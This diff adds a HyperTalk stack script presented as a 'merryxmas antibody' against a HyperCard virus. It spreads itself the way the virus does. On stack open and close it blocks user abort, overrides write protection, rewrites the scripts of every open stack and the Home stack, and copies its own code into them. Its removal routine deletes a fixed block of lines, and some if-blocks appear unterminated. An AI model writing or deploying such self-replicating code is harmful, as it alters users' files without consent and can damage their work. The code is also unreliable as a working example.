@@ -1,0 +1,146 @@
+on openStack --merryxmas antibody
+-- DO NOT DELETE THIS CODE, it keeps the virus known as merryxmas
+-- OFF your computer!!!! written by: The Black Knight
+doStuff
+pass openstack
+end openStack
+
+on closestack
+doStuff
+pass closestack
+end closestack
+
+on doStuff
+put cantabort of this stack into c
+set cantabort of this stack to true
+
+global merryxmasAntibodyCheckListA,merryxmasAntibodyCheckListB
+put merryxmasAntibodyCheckListA into listA
+put merryxmasAntibodyCheckListB into listB
+put empty into my
+put the stacksinuse into stk
+put the number of lines in stk into ln
+put 0 into counter
+
+repeat ln times
+put 1 + counter into counter
+put the long name of stack (line counter of stk) into temp
+if listA contains temp then
+else
+put return & temp after listA
+put line counter of stk into temp
+put the script of stack temp into scr
+put purgevir(scr) into scr
+put cantmodify of stack temp into a
+set cantmodify of stack temp to false
+set the script of stack temp to scr
+set cantmodify of stack temp to a
+end if
+end repeat
+
+put empty into scr
+put the long name of home into temp
+if listA contains temp then
+else
+put return & the long name of home after listA
+put the script of home into scr
+put purgevir(scr) into scr
+put cantmodify of home into a
+set cantmodify of home to false
+set the script of home to scr
+set cantmodify of home to a
+end if
+if listB contains temp then
+else
+put return & the long name of home after listB
+if scr is empty then put the script of home into scr
+put the long name of me into st
+if st is the long name of home then put getme(the script of home) into my
+else put getme(the script of this background) into my
+if scr contains "on openstack --merryxmas antibody" then
+else put return & my after scr
+put cantmodify of home into a
+set cantmodify of home to false
+set the script of home to scr
+set cantmodify of home to a
+end if
+
+put empty into scr
+put the long name of this stack into temp
+if listA contains temp then
+else
+put the script of this stack into scr
+put purgevir(scr) into scr
+put return & temp after listA
+put cantmodify of this stack into a
+set cantmodify of this stack to false
+set the script of this stack to scr
+set cantmodify of this stack to a
+end if
+if listB contains temp then
+else
+put the script of this background into scr
+if my is empty then
+put the long name of me into st
+if st is the long name of home then put getme(the script of home) into my
+else put getme(the script of this background) into my
+end if
+if scr contains "on openstack --merryxmas antibody" then
+else put return & my after scr
+put return & temp after listB
+put cantmodify of this stack into a
+set cantmodify of this stack to false
+set the script of this background to scr
+set cantmodify of this stack to a
+end if
+
+put listA into merryxmasAntibodyCheckListA
+put listB into merryxmasAntibodyCheckListB
+set cantabort of this stack to c
+end doStuff
+
+function lineoffset sea,src
+return the number of lines in (char 1 to offset(sea,src) of src)
+end lineoffset
+
+function getme src
+put lineoffset("on openstack --merryxmas antibody",src) into a
+put a + 143 into c
+put (line a to c of src) into b
+return b
+end getme
+
+function vacinate src,a
+if (src contains "on openbackground merryxmas") or ¬
+(src contains "on openbackground --merryxmas") or (a is true) then
+else
+put return & return & "--- DO NOT DELETE ---" & return & ¬
+"--•••• MERRYXMAS VIRUS BLOCK ••••--" & return &¬
+"--on openbackground merryxmas" & return &¬
+"--on closebackground merryxmas" & return &¬
+"--on idle merryxmas" & return &¬
+"--on openbackground --merryxmas" & return &¬
+"--on closebackground --merryxmas" & return &¬
+"--on idle --merryxmas" & return &¬
+"-- DO NOT DELETE" & return &¬
+"-- •• MERRYXMAS VIRUS BLOCKER •• --" & return & "--" & return after src
+end if
+return src
+end vacinate
+
+function purgevir src
+put empty into b
+if src contains "on openbackground merryxmas" then
+put lineoffset("on openbackground merryxmas",src) into a
+if (char 1 to 27 of line a of src) is "on openbackground merryxmas" then
+put a into b
+end if
+if src contains "on openbackground --merryxmas" then
+put lineoffset("on openbackground --merryxmas",src) into a
+if (char 1 to 29 of line a of src) is "on openbackground --merryxmas" then
+put a into b
+end if
+if b is not empty then delete line b to (b+54) of src
+put vacinate(src,false) into src
+return src
+end purgevir
